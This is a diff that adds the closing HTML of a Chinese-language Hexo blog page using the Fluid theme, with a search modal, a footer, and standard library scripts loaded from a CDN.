+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
